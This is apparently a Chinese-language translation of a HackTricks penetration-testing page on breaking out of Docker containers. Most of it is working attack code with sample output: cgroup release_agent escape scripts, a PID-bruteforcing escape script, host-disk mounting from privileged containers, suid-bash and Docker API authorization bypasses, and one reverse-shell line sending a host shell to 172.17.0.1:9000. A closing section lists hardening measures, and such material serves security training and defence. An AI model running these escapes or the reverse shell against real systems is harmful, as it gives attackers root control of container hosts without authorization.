<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


# 什么是容器

简而言之，它是一个通过**cgroups**（进程可以使用的资源，如CPU和RAM）和**namespaces**（进程可以看到的内容，如目录或其他进程）实现的**隔离的** **进程**：
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# 挂载的docker套接字

如果你发现**docker套接字被挂载**在docker容器内部，你将能够从中逃脱。\
这通常发生在出于某种原因需要连接到docker守护进程以执行操作的docker容器中。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
在这种情况下，您可以使用常规的docker命令与docker守护进程通信：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
如果**docker socket位于意外位置**，您仍然可以使用带有参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与其通信。
{% endhint %}

# 容器能力

您应该检查容器的能力，如果它具有以下任何能力，您可能能够从中逃脱：**`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

您可以使用以下命令检查当前容器的能力：
```bash
capsh --print
```
在以下页面中，您可以**了解更多关于Linux能力**以及如何滥用它们：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# `--privileged` 标志

`--privileged` 标志允许容器访问宿主机的设备。

## 我拥有 Root 权限

配置良好的Docker容器不会允许像 **fdisk -l** 这样的命令。然而，在配置错误的Docker命令中，如果指定了 `--privileged` 标志，就有可能获得查看宿主机驱动器的权限。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

因此，要接管宿主机器，这是微不足道的：
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
```markdown
瞧！您现在可以访问宿主机的文件系统，因为它被挂载在`/mnt/hola`文件夹中。

{% code title="初始概念验证" %}
```
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
```
{% endcode %}

{% code title="第二个概念验证" %}
```
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
```markdown
{% endcode %}

使用 `--privileged` 标志会引入重大的安全问题，此漏洞利用依赖于启用此标志的 docker 容器。使用此标志时，容器可以完全访问所有设备，并且不受 seccomp、AppArmor 和 Linux 权限的限制。

实际上，`--privileged` 提供的权限远远超过了通过此方法逃逸 docker 容器所需的权限。实际上，“唯一”的要求是：

1. 我们必须在容器内以 root 身份运行
2. 容器必须以 `SYS_ADMIN` Linux 权限运行
3. 容器必须缺少 AppArmor 配置文件，或者允许 `mount` 系统调用
4. 容器内必须以读写方式挂载 cgroup v1 虚拟文件系统

`SYS_ADMIN` 权限允许容器执行 mount 系统调用（参见 [man 7 capabilities](https://linux.die.net/man/7/capabilities)）。[Docker 默认以限制的权限集启动容器](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)，并且由于安全风险，不启用 `SYS_ADMIN` 权限。

此外，Docker [默认以 `docker-default` AppArmor 策略启动容器](https://docs.docker.com/engine/security/apparmor/#understand-the-policies)，即使容器以 `SYS_ADMIN` 运行，该策略也[阻止使用 mount 系统调用](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)。

如果容器以以下标志运行，则容器将容易受到此技术的攻击：`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## 分析概念验证

现在我们已经理解了使用这种技术的要求，并且已经完善了概念验证漏洞利用，让我们逐行分析它，以演示它是如何工作的。

要触发此漏洞，我们需要一个 cgroup，在其中我们可以创建一个 `release_agent` 文件，并通过杀死 cgroup 中的所有进程来触发 `release_agent` 的调用。实现这一点的最简单方法是挂载一个 cgroup 控制器并创建一个子 cgroup。

为此，我们创建一个 `/tmp/cgrp` 目录，挂载 [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup 控制器并创建一个子 cgroup（出于示例目的，在此命名为“x”）。虽然并非所有 cgroup 控制器都经过测试，但这种技术应该适用于大多数 cgroup 控制器。

如果你跟随操作并收到“mount: /tmp/cgrp: special device cgroup does not exist”的消息，那是因为你的设置没有 RDMA cgroup 控制器。将 `rdma` 更改为 `memory` 即可解决。我们使用 RDMA 是因为原始的 PoC 只设计为与它一起工作。

请注意，cgroup 控制器是全局资源，可以多次以不同的权限挂载，一个挂载中的更改将应用于另一个挂载。

我们可以在下面看到“x”子 cgroup 的创建和其目录列表。
```
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
接下来，我们通过向“x” cgroup的`notify_on_release`文件写入1来启用cgroup在释放时的通知。我们还设置RDMA cgroup释放代理来执行`/cmd`脚本——稍后我们将在容器中创建这个脚本——通过将主机上的`/cmd`脚本路径写入`release_agent`文件来实现。为此，我们将从`/etc/mtab`文件中获取容器在主机上的路径。

我们在容器中添加或修改的文件在主机上也存在，可以从两个世界中修改它们：容器中的路径和它们在主机上的路径。

下面可以看到这些操作：
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
注意我们将在主机上创建的`/cmd`脚本的路径：
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
现在，我们创建`/cmd`脚本，使其执行`ps aux`命令，并通过指定宿主机上输出文件的完整路径，将其输出保存到容器的`/output`中。最后，我们还打印`/cmd`脚本以查看其内容：
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
```markdown
最后，我们可以通过在“x”子 cgroup 内启动一个立即结束的进程来执行攻击。通过创建一个 `/bin/sh` 进程，并将其 PID 写入“x”子 cgroup 目录中的 `cgroup.procs` 文件，`/bin/sh` 退出后宿主机上的脚本将会执行。然后在宿主机上执行的 `ps aux` 输出被保存到容器内的 `/output` 文件中：
```
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` 标志 v2

之前的 PoCs 在容器配置了一个暴露挂载点完整主机路径的存储驱动时工作正常，例如 `overlayfs`，但我最近遇到了几种配置，它们并没有明显地暴露主机文件系统的挂载点。

## Kata 容器
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) 默认通过 `9pfs` 挂载容器的根文件系统。这不会泄露 Kata Containers 虚拟机中容器文件系统位置的任何信息。

\* 未来的博客文章中将更多介绍 Kata Containers。

## 设备映射器
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
我在一个实时环境中看到了一个容器使用了这个 root 挂载，我相信容器是用特定的 `devicemapper` 存储驱动配置运行的，但在这一点上，我无法在测试环境中复制这种行为。

## 另一种 PoC

显然，在这些情况下，没有足够的信息来识别宿主文件系统上容器文件的路径，因此 Felix 的 PoC 不能照搬使用。然而，我们仍然可以通过一点点创造性来执行这种攻击。

所需的一个关键信息是相对于容器宿主的完整路径，即在容器内要执行的文件的路径。由于我们无法从容器内的挂载点辨别出这一点，我们必须另寻他法。

### Proc 来救援 <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

Linux 的 `/proc` 伪文件系统为系统上运行的所有进程暴露了内核进程数据结构，包括在不同命名空间中运行的进程，例如在容器内。这可以通过在容器中运行命令并访问宿主上该进程的 `/proc` 目录来显示：Container
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
作为旁注，`/proc/<pid>/root` 数据结构曾让我困惑很长时间，我一直不明白为什么需要一个指向 `/` 的符号链接有什么用，直到我在手册页中读到了实际定义：

> /proc/\[pid]/root
>
> UNIX和Linux支持每个进程文件系统根目录的概念，通过chroot(2)系统调用设置。这个文件是一个指向进程根目录的符号链接，并且行为方式与exe和fd/\*相同。
>
> 但请注意，这个文件不仅仅是一个符号链接。它提供了与进程本身相同的文件系统视图（包括命名空间和每个进程的挂载集）。

`/proc/<pid>/root` 符号链接可以用作容器内任何文件的主机相对路径：Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
这改变了攻击的要求，从知道容器主机相对于容器内文件的完整路径，变为知道容器中_任何_进程的pid。

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

这实际上是容易的部分，Linux中的进程id是数字的，并且是顺序分配的。`init`进程被分配进程id `1`，所有后续进程都被分配增量id。要识别容器内进程的主机进程id，可以使用暴力增量搜索：
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
宿主机
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### 整合所有步骤 <a href="putting-it-all-together" id="putting-it-all-together"></a>

为了完成这次攻击，可以使用暴力破解技术来猜测路径 `/proc/<pid>/root/payload.sh` 的 pid，每次迭代都将猜测的 pid 路径写入 cgroups 的 `release_agent` 文件，触发 `release_agent`，并检查是否创建了输出文件。

这种技术的唯一注意事项是它绝不微妙，可能会使 pid 计数非常高。由于没有长时间运行的进程保持运行，这 _应该_ 不会引起可靠性问题，但不要引用我的话。

下面的 PoC 实现了这些技术，提供了一个比 Felix 最初的 PoC 更通用的攻击方法，用于利用 cgroups 的 `release_agent` 功能逃离特权容器：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
在特权容器内执行 PoC 应该会提供类似于以下的输出：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Runc 漏洞利用 (CVE-2019-5736)

如果你能以 root 身份执行 `docker exec`（可能需要通过 sudo），你可以尝试通过滥用 CVE-2019-5736 来提升权限，从容器中逃逸（漏洞利用[在这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）。这项技术基本上会**覆盖** **宿主机**上的 _**/bin/sh**_ 二进制文件**从容器中**，因此任何执行 docker exec 的人可能会触发有效载荷。

根据需要更改有效载荷，并使用 `go build main.go` 构建 main.go。生成的二进制文件应放置在 docker 容器中执行。\
执行后，一旦显示 `[+] Overwritten /bin/sh successfully`，你需要从宿主机执行以下命令：

`docker exec -it <container-name> /bin/sh`

这将触发存在于 main.go 文件中的有效载荷。

更多信息：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# Docker 认证插件绕过

在某些情况下，系统管理员可能会安装一些插件到 docker，以防止低权限用户与 docker 交互，同时无法提升权限。

## 禁止 `run --privileged`

在这种情况下，系统管理员**禁止用户挂载卷和使用 `--privileged` 标志运行容器**或给容器任何额外的能力：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
然而，用户可以**在运行中的容器内创建一个具有额外权限的 shell**：
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
现在，用户可以使用之前讨论过的任何技术从容器中逃离，并在主机内部提升权限。

## 挂载可写文件夹

在这种情况下，系统管理员**禁止用户使用 `--privileged` 标志运行容器**或给容器任何额外的能力，他只允许挂载 `/tmp` 文件夹：
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
请注意，您可能无法挂载文件夹 `/tmp`，但您可以挂载**其他可写文件夹**。您可以使用以下命令找到可写目录：`find / -writable -type d 2>/dev/null`

**请注意，并非所有 Linux 机器上的目录都支持 suid 位！**为了检查哪些目录支持 suid 位，请运行 `mount | grep -v "nosuid"`。例如，通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup` 和 `/var/lib/lxcfs` 不支持 suid 位。

还请注意，如果您能够**挂载 `/etc`** 或包含配置文件的任何其他文件夹，您可以作为 root 在 docker 容器中更改它们，以便**在宿主机中滥用它们**并提升权限（可能修改 `/etc/shadow`）。
{% endhint %}

## 未检查的 JSON 结构

当系统管理员配置 docker 防火墙时，他可能**忘记了 API 的一些重要参数**（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)），比如 "**Binds**"。\
在以下示例中，可以利用这种配置错误来创建并运行一个挂载宿主机根目录（/）的容器：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## 未检查的 JSON 属性

当系统管理员配置 docker 防火墙时，他可能**忘记了 API 参数的一些重要属性**（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)），例如在 "**HostConfig**" 中的 "**Capabilities**"。在下面的例子中，可以利用这种错误配置来创建并运行一个具有 **SYS_MODULE** 能力的容器：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# 可写的 hostPath 挂载

(信息来自 [**这里**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) 在容器内部，攻击者可能尝试通过集群创建的可写 hostPath 卷来进一步访问底层宿主操作系统。以下是一些你可以在容器内检查的常见事项，以查看你是否可以利用这个攻击向量：
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# 容器安全改进

## Docker 中的 Seccomp

这不是从 Docker 容器中逃逸的技术，而是 Docker 使用的安全功能，您应该了解它，因为它可能会阻止您从 docker 中逃逸：

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## Docker 中的 AppArmor

这不是从 Docker 容器中逃逸的技术，而是 Docker 使用的安全功能，您应该了解它，因为它可能会阻止您从 docker 中逃逸：

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## AuthZ & AuthN

授权插件根据当前的**认证**上下文和**命令**上下文**批准**或**拒绝**对 Docker **守护进程**的**请求**。**认证**上下文包含所有**用户详细信息**和**认证**方法。**命令上下文**包含所有相关的**请求**数据。

{% content-ref url="broken-reference" %}
[损坏的链接](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor** 是一个用 Go 编写的应用内核，实现了 Linux 系统表面的大部分功能。它包括一个名为 `runsc` 的 [Open Container Initiative (OCI)](https://www.opencontainers.org) 运行时，该运行时提供了应用程序与宿主内核之间的**隔离边界**。`runsc` 运行时与 Docker 和 Kubernetes 集成，使得运行沙盒化容器变得简单。

{% embed url="https://github.com/google/gvisor" %}

# Kata 容器

**Kata 容器** 是一个开源社区，致力于构建一个安全的容器运行时，使用轻量级虚拟机，这些虚拟机感觉和表现得像容器，但使用硬件虚拟化技术作为第二层防御，提供**更强的工作负载隔离**。

{% embed url="https://katacontainers.io/" %}

## 安全使用容器

Docker 默认限制和限制容器。放松这些限制可能会造成安全问题，即使没有 `--privileged` 标志的全部权限。重要的是要认识到每个额外权限的影响，并将权限总体限制在必要的最低限度。

为了帮助保持容器的安全：

* 不要使用 `--privileged` 标志或在容器内挂载 [Docker 套接字](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)。Docker 套接字允许生成容器，因此它是完全控制宿主的一种简单方法，例如，通过运行另一个带有 `--privileged` 标志的容器。
* 不要在容器内以 root 身份运行。使用 [不同的用户](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) 或 [用户命名空间](https://docs.docker.com/engine/security/userns-remap/)。除非使用用户命名空间重新映射，否则容器中的 root 与宿主上的 root 相同。它仅被 Linux 命名空间、能力和 cgroups 主要限制。
* [放弃所有能力](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) 并仅启用所需的能力 (`--cap-add=...`)。许多工作负载不需要任何能力，添加它们会增加潜在攻击的范围。
* [使用“no-new-privileges”安全选项](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)以防止进程获得更多权限，例如通过 suid 二进制文件。
* [限制容器可用的资源](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)。资源限制可以保护机器免受拒绝服务攻击。
* 调整 [seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（或 SELinux）配置文件，将容器可用的操作和系统调用限制在所需的最低限度。
* 使用 [官方 docker 镜像](https://docs.docker.com/docker-hub/official_images/)或基于它们构建自己的镜像。不要继承或使用 [后门](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) 镜像。
* 定期重建镜像以应用安全补丁。这是不言而喻的。

# 参考资料

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF** 版本，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 系列
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
